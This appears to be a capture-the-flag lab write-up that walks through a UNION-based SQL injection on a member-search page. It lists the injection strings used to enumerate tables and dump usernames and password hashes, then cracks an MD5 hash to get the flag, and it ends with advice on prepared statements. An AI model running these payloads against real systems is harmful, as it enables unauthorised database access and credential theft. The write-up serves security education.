# MEMBERS PAGE

## Explanations

In the members page, we encounter a textfield with a submit to search a member by ID.

Before even beginning, if we submit nothing we have this message:

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1` => an SQL injection seems to be possible !

Typing an ID gives us indeed a user linked to that ID, for example typing `1` will give us:

```
ID: 1
First name: Barack Hussein
Surname : Obama
```

Now let's get some more informations about the database.

We can try to add another SQL request with `UNION` and get more infos with the request:

```
 1 UNION SELECT * FROM information_schema.columns
```

giving us this output:

```
The used SELECT statements have a different number of columns
```

It seems like we need to select only 2 informations because our first SQL request only gave us `First name` and `Surname` (the output needs to remain on 2 columns)

So let's get all the columns and tables avalaible on the dabase with:

```
 1 UNION SELECT column_name, table_name FROM information_schema.columns
```

It worked ! By looking closely we see a `users` table that has 8 columns:  
 `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire` and `countersign`

Let's check each users with:

```
1 UNION SELECT last_name, first_name FROM users
```

One of the users returns us `GetThe` as 'last_name' and `Flag` as 'first_name' !

By checking the other infos about this user, we finally try:

```
1 UNION SELECT Commentaire, countersign FROM users
```

and get:

```
ID: 1 UNION SELECT Commentaire, countersign FROM users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

Let's get this flag now !

First we decrypt (MD5) `5ff9d0165b4f92b14994e5c685cdce28` which gives us `FortyTwo` then lowered the chars to `fortytwo`

Finally, we get the flag by applying SHA256 which gives us : `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

---

## How to avoid that security breach ?

A good way to counter that could be to use Prepared statements. ORMs do that trick usually pretty well. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied.

---

#### Sources

[All infos about SQL database](https://stackoverflow.com/questions/600446/how-do-you-return-the-column-names-of-a-table)  
[SQL injection prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
[Find Table Names for SQL Injection](https://www.sqlinjection.net/table-names/)
[MD5 Decrypter](https://md5decrypt.net/)
[SHA256 Encrypter](https://md5decrypt.net/Sha256/)
